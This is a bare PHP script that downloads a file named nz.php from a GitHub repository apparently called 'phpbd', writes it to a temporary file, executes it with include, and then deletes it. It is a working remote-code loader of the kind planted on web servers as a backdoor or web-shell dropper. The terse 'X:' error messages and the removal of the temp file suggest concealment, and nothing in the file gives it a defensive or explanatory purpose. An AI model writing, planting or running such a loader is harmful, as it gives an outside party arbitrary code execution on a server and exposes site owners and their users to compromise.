<?php

$url = 'https://raw.githubusercontent.com/laolierzi-commits/phpbd/refs/heads/main/nz.php';


$tempDir = sys_get_temp_dir();
$tempFile = $tempDir . '/temp_script_' . uniqid() . '.php';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
$content = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($httpCode == 200 && !empty($content)) {
	
    if (file_put_contents($tempFile, $content)) {
        include $tempFile;
        unlink($tempFile);
    } else {
        echo "X: " . $tempFile;
    }

} else {
    echo "X: " . $httpCode;
}
?>
